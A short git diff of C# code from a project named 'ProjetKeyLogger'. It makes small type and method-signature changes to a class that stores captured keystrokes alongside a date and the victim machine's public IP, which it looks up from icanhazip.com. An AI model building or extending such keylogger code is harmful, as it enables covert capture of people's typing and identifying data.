@@ -7,12 +7,12 @@ namespace ProjetKeyLogger
     public class Enregistrement
     {
         //Contenu de l'enregistrement courrant
-        private string contenu;
-        private string date;
-        private string adresse_ip_publique;
+        private String contenu;
+        private String date;
+        private String adresse_ip_publique;
 
         //proprieté en lecture / ecriture
-        public string Contenu
+        public String Contenu
         {
             get
             {
@@ -24,7 +24,7 @@ namespace ProjetKeyLogger
             }
         }
         //proprieté en lecture / ecriture
-        public string Date
+        public String Date
         {
             get
             {
@@ -37,11 +37,10 @@ namespace ProjetKeyLogger
         }
 
         //proprieté en lecture / ecriture
-        public string Adresse_Ip_Publique
+        public String Adresse_Ip_Publique
         {
             get
             {
-                adresse_ip_publique = adresseIpPublique();
                 return adresse_ip_publique;
             }
             set
@@ -61,10 +60,10 @@ namespace ProjetKeyLogger
         }
 
         //Renvoie l'adresse IP publique
-        private String adresseIpPublique()
+        public void adresseIpPublique()
         {
             //Retourne l'adresse IP publique
-            return new WebClient().DownloadString("http://icanhazip.com");
+            adresse_ip_publique =  new WebClient().DownloadString("http://icanhazip.com");
         }
 
         //Fonction qui concatene la derniere touche tapé au clavier , au contenu de l'enregistrement
@@ -84,9 +83,9 @@ namespace ProjetKeyLogger
             }
         }
 
-        public string traitementContenue()
+        public String traitementContenue()
         {
-            string contenu_claire = this.contenu;
+            String contenu_claire = this.contenu;
 
 
 
